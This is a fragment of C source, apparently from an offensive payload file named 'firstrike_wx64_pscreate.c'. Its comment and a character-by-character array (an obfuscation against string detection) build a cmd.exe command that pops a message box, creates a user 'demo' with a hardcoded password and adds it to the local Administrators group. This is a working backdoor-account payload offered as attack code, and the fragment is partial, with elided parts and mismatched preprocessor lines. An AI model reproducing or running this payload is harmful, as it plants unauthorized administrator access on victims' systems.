...
// firstrike_wx64_pscreate.c : create a user called demo with password P@ssw0rd123! and place it in local administrators group automatically. Will also pop messagebox for confirmation.
...
#endif _PSCMD_USER
#ifdef _PSCMD
	CHAR szCMD[] = { 'C', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c','m','d','.','e', 'x', 'e', ' ', '/', 'c', ' ', '"','m','s','g',' ','*',' ','P','N',' ','&','&',' ', 'n', 'e', 't', ' ', 'u', 's', 'e', 'r', ' ', 'd', 'e', 'm', 'o',' ', 'P', '@', 's', 's', 'w', '0', 'r', 'd', '1', '2', '3', '!', ' ', '/', 'a', 'd', 'd', ' ', '&', '&', ' ', 'n', 'e', 't', ' ', 'l', 'o', 'c', 'a', 'l', 'g', 'r', 'o', 'u', 'p', ' ', 'A', 'd', 'm', 'i', 'n', 'i', 's', 't', 'r', 'a', 't', 'o', 'r', 's', ' ', 'd', 'e', 'm','o', ' ', '/', 'a', 'd', 'd', '"', 0 };
